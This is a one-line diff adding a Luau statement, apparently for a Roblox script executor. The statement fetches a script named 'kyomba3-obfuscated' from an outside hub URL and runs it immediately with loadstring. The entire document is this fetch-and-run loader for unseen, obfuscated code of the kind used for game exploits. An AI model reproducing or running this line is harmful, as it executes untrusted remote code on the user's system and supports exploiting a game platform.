@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://slh-hub.lovable.app/raw/kyomba3-obfuscated"))()
